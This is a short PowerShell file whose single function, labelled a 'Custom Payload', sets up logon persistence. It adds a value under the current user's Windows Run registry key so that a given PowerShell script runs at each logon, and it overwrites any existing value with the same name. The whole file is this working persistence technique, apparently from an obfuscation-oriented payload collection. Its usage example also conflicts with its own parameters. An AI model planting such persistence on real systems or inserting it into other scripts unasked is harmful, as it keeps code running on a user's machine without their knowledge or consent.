function Test-Add-Persistence-Script
{
<#
.SYNOPSIS
Custom Payload to add a registry key under HKCU to execute a PowerShell local script.

.DESCRIPTION
This payload adds a registry key under HKCU to execute a PowerShell local script.

.PARAMETER RKEY_NAME
The RKEY_NAME defines the Registry key name.

.PARAMETER PWS_FILE_PATH
The PWS_COMMAND defines the PowerShell local script to be executed.

.EXAMPLE
PS > Test-Add-Persistence-Script "C:\Users\user\Downloads\Hello.ps1"

.LINK
https://github.com/FabianConP/ObfuscationCode
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RKEY_NAME,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $PWS_FILE_PATH
    )
    
    $pwsCommandForm = "powershell -File $PWS_FILE_PATH"
    $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
    
    # Check if it already exists a key with the given name
    if($runKeys.$RKEY_NAME){
        # Remove it if already exists
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME
    }
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME -Value $pwsCommandForm
}